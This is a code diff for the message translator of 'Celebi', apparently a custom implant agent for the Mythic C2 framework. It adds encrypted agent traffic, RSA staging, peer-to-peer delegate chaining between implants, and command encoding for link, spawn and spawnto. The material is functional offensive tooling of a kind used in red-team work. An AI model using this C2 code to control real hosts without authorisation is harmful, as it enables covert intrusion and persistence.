@@ -1,13 +1,40 @@
 import mythic_container
 import asyncio
 
-import json, base64
+import json, base64, os
 from mythic_container.TranslationBase import *
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives import hashes, hmac as chmac
+
+
+def encrypt_aes256_hmac(key: bytes, msg: bytes) -> bytes:
+	# Mythic aes256_hmac: IV(16) || AES-256-CBC-PKCS7 || HMAC-SHA256(key, IV||CT)
+	iv = os.urandom(16)
+	pad_len = 16 - (len(msg) % 16)
+	padded = msg + bytes([pad_len]) * pad_len
+	enc = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
+	ct = enc.update(padded) + enc.finalize()
+	h = chmac.HMAC(key, hashes.SHA256())
+	h.update(iv + ct)
+	return iv + ct + h.finalize()
+
+
+def decrypt_aes256_hmac(key: bytes, blob: bytes) -> bytes:
+	iv, ct, mac = blob[:16], blob[16:-32], blob[-32:]
+	h = chmac.HMAC(key, hashes.SHA256())
+	h.update(iv + ct)
+	h.verify(mac)
+	dec = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
+	padded = dec.update(ct) + dec.finalize()
+	pad = padded[-1]
+	return padded[:-pad]
 
 MESSAGE_TYPE_CHECKIN = 1
 MESSAGE_TYPE_TASKING = 2
 MESSAGE_TYPE_POST    = 3
 MESSAGE_TYPE_UPLOAD  = 4
+MESSAGE_TYPE_STAGING = 5
+MESSAGE_TYPE_STAGING_REPLY = 6
 
 POST_STATUSES = {
 	1:  "success",
@@ -32,60 +59,105 @@ class CelebiTranslation(TranslationContainer):
 	author = "@ofasgard"
 
 	async def generate_keys(self, inputMsg: TrGenerateEncryptionKeysMessage) -> TrGenerateEncryptionKeysMessageResponse:
-		# Currently unused.
+		# Mythic asks us for the crypto keys because mythic_encrypts=False.
+		# Generate a fresh 32-byte key per payload for aes256_hmac.
 		response = TrGenerateEncryptionKeysMessageResponse(Success=True)
-		response.DecryptionKey = b""
-		response.EncryptionKey = b""
+		if inputMsg.CryptoParamValue == "aes256_hmac":
+			key = os.urandom(32)
+			response.EncryptionKey = key
+			response.DecryptionKey = key
+		else:
+			response.EncryptionKey = b""
+			response.DecryptionKey = b""
 		return response
 
+	def _get_crypto_key(self, crypto_keys, encrypt: bool):
+		# CryptoKeys is a list of CryptoKeys(EncKey, DecKey, Value, Location).
+		# Returns the raw key bytes for aes256_hmac, or None when crypto is off.
+		for ck in (crypto_keys or []):
+			if getattr(ck, "Value", "") == "aes256_hmac":
+				return ck.EncKey if encrypt else ck.DecKey
+		return None
+
+	def _build_envelope(self, uuid: str, binary: bytes, key) -> bytes:
+		# Full wire envelope: base64( uuid(36) || [encrypted] binary )
+		blob = encrypt_aes256_hmac(key, binary) if key else binary
+		return base64.b64encode(uuid.encode() + blob)
+
 	async def translate_to_c2_format(self, inputMsg: TrMythicC2ToCustomMessageFormatMessage) -> TrMythicC2ToCustomMessageFormatMessageResponse:
-		# The C2 is talking to the agent.
+		# The C2 is talking to the agent. We return the full wire envelope:
+		# base64( uuid || [encrypted] binary ). Mythic passes our output through verbatim.
 		response = TrMythicC2ToCustomMessageFormatMessageResponse(Success=True)
+		key = self._get_crypto_key(inputMsg.CryptoKeys, encrypt=True)
 		
 		if inputMsg.Message["action"] == "checkin":
 			serialized_reply = self.serialize_checkin_reply(inputMsg.Message)
-			response.Message = base64.b64encode(serialized_reply)
-		if inputMsg.Message["action"] == "get_tasking":
+		elif inputMsg.Message["action"] == "staging_rsa":
+			serialized_reply = self.serialize_staging_reply(inputMsg.Message)
+		elif inputMsg.Message["action"] == "get_tasking":
 			serialized_reply = self.serialize_tasking_reply(inputMsg.Message)
-			response.Message = base64.b64encode(serialized_reply)
-		if inputMsg.Message["action"] == "post_response":
+		elif inputMsg.Message["action"] == "post_response":
 			# Is this a normal reply to post_response, or are we replying to an upload request?
 			if "responses" in inputMsg.Message and "chunk_data" in inputMsg.Message["responses"][0]:
 				serialized_reply = self.serialize_upload_reply(inputMsg.Message)
-				response.Message = base64.b64encode(serialized_reply)
-				
 			else:
 				serialized_reply = self.serialize_post_reply(inputMsg.Message)
-				response.Message = base64.b64encode(serialized_reply)
-			
+		else:
+			serialized_reply = b""
+		
+		response.Message = self._build_envelope(inputMsg.UUID, serialized_reply, key)
 		return response
 
 	async def translate_from_c2_format(self, inputMsg: TrCustomMessageToMythicC2FormatMessage) -> TrCustomMessageToMythicC2FormatMessageResponse:
-		# The agent is talking to the C2.
+		# The agent is talking to the C2. Mythic already stripped the outer UUID,
+		# so inputMsg.Message is the (possibly encrypted) binary payload.
 		response = TrCustomMessageToMythicC2FormatMessageResponse(Success=True)
 		
-		if inputMsg.Message[0] == MESSAGE_TYPE_CHECKIN:
-			response.Message = self.deserialize_checkin_request(inputMsg.UUID, inputMsg.Message)
+		msg = inputMsg.Message
+		key = self._get_crypto_key(inputMsg.CryptoKeys, encrypt=False)
+		if key:
+			try:
+				msg = decrypt_aes256_hmac(key, msg)
+			except Exception as e:
+				response.Success = False
+				response.Error = "failed to decrypt agent message: {}".format(e)
+				return response
+		
+		if msg[0] == MESSAGE_TYPE_CHECKIN:
+			response.Message = self.deserialize_checkin_request(msg)
 			return response
-		if inputMsg.Message[0] == MESSAGE_TYPE_TASKING:
-			response.Message = self.deserialize_tasking_request(inputMsg.Message)
+		if msg[0] == MESSAGE_TYPE_STAGING:
+			response.Message = self.deserialize_staging_request(msg)
 			return response
-		if inputMsg.Message[0] == MESSAGE_TYPE_POST:
-			response.Message = self.deserialize_post_request(inputMsg.Message)
+		if msg[0] == MESSAGE_TYPE_TASKING:
+			response.Message = self.deserialize_tasking_request(msg)
+			return response
+		if msg[0] == MESSAGE_TYPE_POST:
+			response.Message = self.deserialize_post_request(msg)
 			response.Message = self.resolve_post_messages(response.Message)
 			return response
-		if inputMsg.Message[0] == MESSAGE_TYPE_UPLOAD:
-			response.Message = self.deserialize_upload_request(inputMsg.Message)
+		if msg[0] == MESSAGE_TYPE_UPLOAD:
+			response.Message = self.deserialize_upload_request(msg)
 			return response
 		
-		raise Exception("UNRECOGNISED INPUT MESSAGE TYPE: {}".format(inputMsg.Message))
+		raise Exception("UNRECOGNISED INPUT MESSAGE TYPE: {}".format(msg))
 
-	def deserialize_checkin_request(self, payload_uuid, packed_msg):
+	def deserialize_checkin_request(self, packed_msg):
 		data = {}
 		data["action"] = "checkin"
-		data["uuid"] = payload_uuid
 		
 		offset = 1
+		
+		# Parse the payload UUID (Mythic links the callback to the payload by it;
+		# the envelope UUID may be a staging tempUUID during RSA EKE).
+		data["uuid"] = ""
+		for byte in packed_msg[offset:]:
+			if byte == 0x00:
+				break
+			data["uuid"] += chr(byte)
+			offset += 1
+		
+		offset +=1 # terminator byte
 		
 		# Parse PID
 		pid_raw = packed_msg[offset:offset+4]
@@ -122,9 +194,44 @@ class CelebiTranslation(TranslationContainer):
 		
 		offset +=1 # terminator byte
 		
+		# Parse the host's local IP (optional, newer agents; absent = no ip).
+		data["ip"] = ""
+		if offset < len(packed_msg):
+			for byte in packed_msg[offset:]:
+				if byte == 0x00:
+					break
+				data["ip"] += chr(byte)
+				offset += 1
+		
 		# Hardcoded parameters
 		data["architecture"] = "x64"
 		data["os"] = "Windows"
+		
+		return data
+		
+	def deserialize_staging_request(self, packed_msg):
+		data = {}
+		data["action"] = "staging_rsa"
+		
+		offset = 1
+		
+		# Parse session id
+		data["session_id"] = ""
+		for byte in packed_msg[offset:]:
+			if byte == 0x00:
+				break
+			data["session_id"] += chr(byte)
+			offset += 1
+		
+		offset +=1 # terminator byte
+		
+		# Parse public key (base64 PKCS#1 DER)
+		data["pub_key"] = ""
+		for byte in packed_msg[offset:]:
+			if byte == 0x00:
+				break
+			data["pub_key"] += chr(byte)
+			offset += 1
 		
 		return data
 		
@@ -132,7 +239,48 @@ class CelebiTranslation(TranslationContainer):
 		data = {}
 		data["action"] = "get_tasking"
 		data["tasking_size"] = packed_msg[1]
+		# Celebi's p2p child pairs one request with one reply; stop Mythic from
+		# batching auto-routed delegate tasks into this (egress) agent's response.
+		data["get_delegate_tasks"] = False
+		offset = 2
+
+		# Delegate messages from linked p2p children (parent side).
+		if offset + 4 <= len(packed_msg):
+			delegate_count = int.from_bytes(packed_msg[offset:offset+4], "little", signed=False)
+			offset += 4
+			delegates = []
+			for _ in range(delegate_count):
+				entry = {}
+				entry["uuid"] = self._read_cstr(packed_msg, offset); offset = self._after_cstr(packed_msg, offset)
+				entry["c2_profile"] = self._read_cstr(packed_msg, offset); offset = self._after_cstr(packed_msg, offset)
+				entry["message"] = self._read_cstr(packed_msg, offset); offset = self._after_cstr(packed_msg, offset)
+				delegates.append(entry)
+			if delegates:
+				data["delegates"] = delegates
+
+			# Callback graph edge updates (link/unlink).
+			if offset + 4 <= len(packed_msg):
+				edge_count = int.from_bytes(packed_msg[offset:offset+4], "little", signed=False)
+				offset += 4
+				edges = []
+				for _ in range(edge_count):
+					entry = {}
+					entry["source"] = self._read_cstr(packed_msg, offset); offset = self._after_cstr(packed_msg, offset)
+					entry["destination"] = self._read_cstr(packed_msg, offset); offset = self._after_cstr(packed_msg, offset)
+					entry["action"] = self._read_cstr(packed_msg, offset); offset = self._after_cstr(packed_msg, offset)
+					entry["c2_profile"] = self._read_cstr(packed_msg, offset); offset = self._after_cstr(packed_msg, offset)
+					edges.append(entry)
+				if edges:
+					data["edges"] = edges
+
 		return data
+
+	def _read_cstr(self, buf, offset):
+		end = buf.index(0, offset)
+		return buf[offset:end].decode("latin-1")
+
+	def _after_cstr(self, buf, offset):
+		return buf.index(0, offset) + 1
 		
 	def deserialize_post_request(self, packed_msg):
 		data = {}
@@ -171,7 +319,9 @@ class CelebiTranslation(TranslationContainer):
 		
 		offset +=1 # terminator byte		   
 		
-		response["completed"] = True
+		# Parse the completed flag (1 = task finished, 0 = more responses coming).
+		# Default to completed if the byte is missing (legacy messages).
+		response["completed"] = bool(packed_msg[offset]) if offset < len(packed_msg) else True
 		data["responses"] = [response]
 		return data
 		
@@ -217,6 +367,18 @@ class CelebiTranslation(TranslationContainer):
 		data["responses"] = [response]
 		return data
 
+	def serialize_staging_reply(self, msg):
+		# [6][temp_uuid\0][session_key\0][session_id\0]
+		output = bytearray()
+		output.append(MESSAGE_TYPE_STAGING_REPLY)
+		output.extend(msg["uuid"].encode())
+		output.append(0)
+		output.extend(msg["session_key"].encode())
+		output.append(0)
+		output.extend(msg["session_id"].encode())
+		output.append(0)
+		return bytes(output)
+		
 	def serialize_checkin_reply(self, msg):
 		output = bytearray()
 		
@@ -251,6 +413,18 @@ class CelebiTranslation(TranslationContainer):
 				
 				rounded_timestamp = int(task["timestamp"])
 				output.extend(rounded_timestamp.to_bytes(4, "little"))
+		
+		# Delegate responses for linked p2p children (parent side).
+		# The messages are already-encrypted full agentMessages; pass them verbatim.
+		delegates = msg.get("delegates", [])
+		output.extend(len(delegates).to_bytes(4, "little"))
+		for delegate in delegates:
+			output.extend(delegate["uuid"].encode())
+			output.append(0)
+			output.extend(delegate["message"].encode())
+			output.append(0)
+			output.extend(delegate.get("new_uuid", delegate.get("mythic_uuid", "")).encode())
+			output.append(0)
 		
 		return bytes(output)
 	
@@ -320,6 +494,24 @@ class CelebiTranslation(TranslationContainer):
 			
 		if cmd == "morph":
 			return param_data["command"] + "\t" + param_data["pico_name"]
+			
+		if cmd == "link":
+			profile = param_data["c2_profile"]
+			host = param_data["host"]
+			pipename = param_data.get("pipename", "")
+			port = str(param_data.get("port", "0"))
+			return profile + "\t" + host + "\t" + pipename + "\t" + port
+			
+		if cmd == "unlink":
+			profile = param_data.get("c2_profile", "")
+			host = param_data.get("host", "")
+			return profile + "\t" + host + "\t\t0"
+			
+		if cmd == "spawn":
+			return str(param_data.get("file", "")) + "\t" + str(param_data.get("port", 0))
+			
+		if cmd == "spawnto":
+			return param_data.get("path", "")
 			
 		raise Exception("Unrecognised command parameter! Original JSON: {}".format(params))
 
